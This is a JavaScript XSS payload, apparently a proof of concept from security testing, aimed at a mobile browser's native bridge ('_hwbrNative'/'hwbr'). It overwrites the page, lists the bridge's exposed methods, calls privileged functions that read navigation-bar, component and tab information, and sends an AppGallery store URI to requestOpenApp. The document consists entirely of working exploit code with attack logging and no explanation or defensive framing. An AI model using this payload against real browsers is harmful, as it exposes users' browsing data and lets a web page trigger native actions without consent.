try {
  document.body.innerHTML = '<div id="atk" style="font-size:14px;color:red;padding:10px;word-break:break-all;"></div>';
  var d = document.getElementById('atk');
  function log(msg) {
    console.log('CLOUDXLAB_ATTACK: ' + msg);
    if (d) { d.innerHTML += msg + '<br>'; }
  }
  log('xss_verify result=success');
  var b = window._hwbrNative;
  if (!b) {
    log('no _hwbrNative, trying window.hwbr');
    b = window.hwbr;
  }
  if (!b) {
    var names = Object.getOwnPropertyNames(window).filter(function(n){ return n.indexOf('hwbr')>=0 || n.indexOf('bridge')>=0 || n.indexOf('Native')>=0 || n.indexOf('Bridge')>=0; });
    log('window props: ' + names.join(','));
    b = null;
  }
  if (b) {
    log('bridge found: ' + (b._hwbrNative ? 'has _hwbrNative' : 'direct'));
    var bn = b._hwbrNative || b;
    log('bn type: ' + typeof bn);
    log('bn keys: ' + Object.getOwnPropertyNames(bn).join(','));
    try {
      var r1 = bn.invokeSync('browser', 'getNavBarInfoSync', JSON.stringify([]));
      log('invokeSync getNavBarInfoSync=' + r1);
    } catch(e) {
      log('invokeSync err=' + e.message);
    }
    try {
      var r2 = bn.invokeSync('browser', 'getNativeCurrentComponentInfoSync', JSON.stringify([]));
      log('invokeSync getNativeCurrentComponentInfoSync=' + r2);
    } catch(e) {
      log('invokeSync2 err=' + e.message);
    }
    try {
      var cb = 'atk_' + Date.now();
      bn.invoke('browser', 'requestOpenApp', cb, JSON.stringify([{appUri:'store://appgallery.huawei.com/app/detail?id=C1081898888199154560'}]), -1);
      log('invoke requestOpenApp dispatched, cb=' + cb);
    } catch(e) {
      log('invoke requestOpenApp err=' + e.message);
    }
    try {
      var cb2 = 'atk2_' + Date.now();
      bn.invoke('browser', 'getTabInfo', cb2, JSON.stringify([]), -1);
      log('invoke getTabInfo dispatched, cb=' + cb2);
    } catch(e) {
      log('invoke getTabInfo err=' + e.message);
    }
  }
} catch(e) {
  document.body.innerHTML = '<div style="color:red">' + e.message + '</div>';
}
